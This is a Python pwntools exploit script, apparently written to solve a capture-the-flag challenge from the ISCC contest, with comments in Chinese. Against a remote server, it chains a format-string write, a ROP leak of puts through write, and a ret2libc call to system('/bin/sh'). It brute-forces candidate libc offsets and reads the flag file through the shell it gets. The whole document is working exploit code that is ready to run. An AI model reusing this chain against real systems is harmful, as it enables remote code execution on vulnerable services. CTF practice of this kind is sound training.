
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== 已知准确的偏移 ======
PUTS_OFFSET = 0x6d1e0
BINSH_OFFSET = 0x18c363

# ====== 试几个不同的system偏移！ ======
possible_system_offsets = [0x41360, 0x45830, 0x3e9e0, 0x449c0, 0x3cd80]

target_val_addr = 0x804c030

for system_offset in possible_system_offsets:
    log.info(f"\n====== 尝试system偏移: 0x{system_offset:x} ======")
    
    try:
        # 连接服务器
        conn = remote('39.96.193.120', 10000)
        conn.recv(timeout=5)
        
        # 设置target_val=5
        fmt_payload = b'%5c%6$na' + p32(target_val_addr)
        conn.send(fmt_payload)
        time.sleep(2)
        
        response = conn.recv(timeout=5)
        if b'Input:' not in response:
            log.error("没触发vuln，跳过")
            conn.close()
            continue
        
        # 泄露puts地址
        write_plt = elf.plt['write']
        puts_got = elf.got['puts']
        vuln_addr = elf.symbols['vuln']
        
        payload = b'A' * 148
        payload += p32(write_plt)
        payload += p32(vuln_addr)
        payload += p32(1)
        payload += p32(puts_got)
        payload += p32(4)
        
        conn.send(payload)
        time.sleep(2)
        
        response = conn.recv(timeout=5)
        puts_leak = u32(response[:4])
        
        # 计算地址
        libc_base = puts_leak - PUTS_OFFSET
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + BINSH_OFFSET
        
        log.info(f"libc基址: 0x{libc_base:x}")
        log.info(f"system: 0x{system_addr:x}")
        log.info(f"/bin/sh: 0x{binsh_addr:x}")
        
        # 构造payload并发送
        payload2 = b'A' * 148
        payload2 += p32(system_addr)
        payload2 += p32(vuln_addr)
        payload2 += p32(binsh_addr)
        
        log.info("发送payload...")
        conn.send(payload2)
        time.sleep(1)
        
        # 尝试cat flag
        conn.sendline(b'cat /flag')
        time.sleep(3)
        
        try:
            flag = conn.recv(timeout=3)
            log.info(f"收到的内容: {flag}")
            
            if b'ISCC' in flag:
                log.success("🎉🎉🎉 成功获取flag！")
                log.success(flag)
                exit(0)
            else:
                log.info("这个偏移没工作，继续下一个")
                
        except Exception as e:
            log.info(f"这个偏移没工作: {e}")
            
        conn.close()
        
    except Exception as e:
        log.error(f"发生错误: {e}")
        try:
            conn.close()
        except:
            pass

log.error("所有偏移都试过了，没成功")
